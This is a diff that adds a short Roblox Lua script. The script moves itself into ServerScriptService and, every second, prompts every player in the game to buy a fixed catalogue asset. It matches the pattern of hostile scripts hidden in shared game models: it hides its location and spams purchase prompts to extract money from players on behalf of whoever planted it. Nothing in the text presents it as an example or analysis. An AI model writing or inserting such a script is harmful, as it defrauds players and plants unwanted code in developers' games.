@@ -1,0 +1,8 @@
+script.Parent = game.ServerScriptService
+assetId= 123008745
+ms=game:service'MarketplaceService'
+while wait(1) do
+for _,v in pairs(game.Players:children'') do
+ms:PromptPurchase(v, assetId)
+end
+end
